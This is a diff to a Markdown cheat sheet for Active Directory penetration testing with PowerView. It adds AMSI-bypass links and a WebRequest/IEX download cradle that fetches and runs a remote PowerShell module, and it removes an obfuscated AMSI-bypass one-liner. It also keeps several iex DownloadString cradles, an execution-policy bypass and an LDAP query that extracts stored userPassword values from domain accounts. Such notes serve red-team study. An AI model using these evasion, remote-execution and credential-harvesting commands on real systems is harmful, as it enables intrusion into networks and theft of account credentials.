@@ -29,16 +29,26 @@ has_children: true
 ##  1. <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+# Bypass AMSI 
+- [amsi.fails]('https://amsi.fails')
+- [S3cur3Th1sSh1t]('https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell')
+- [notes.offsec-journey.com]('https://notes.offsec-journey.com/evasion/amsi-bypass')
 
 ```powershell
 # Bypass powershell execution protection
 powershell -ep bypass
 
-# Bypass AMSI: 
-sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
-# ActiveDirectory Module
+# ActiveDirectory Module v1
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+
+# ActiveDirectory Module v2
+$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
+$resp=$webreq.GetResponse()
+$respstream=$resp.GetResponseStream()
+$reader=[System.IO.StreamReader]::new($respstream)
+$content=$reader.ReadToEnd()
+IEX($content)
 
 # PowerView Module
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');New-InMemoryModule
@@ -366,3 +376,5 @@ Get-ObjectACL "DC=<Domain>,DC=local" -ResolveGUIDs | ? {
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 
 ```
+
+ 
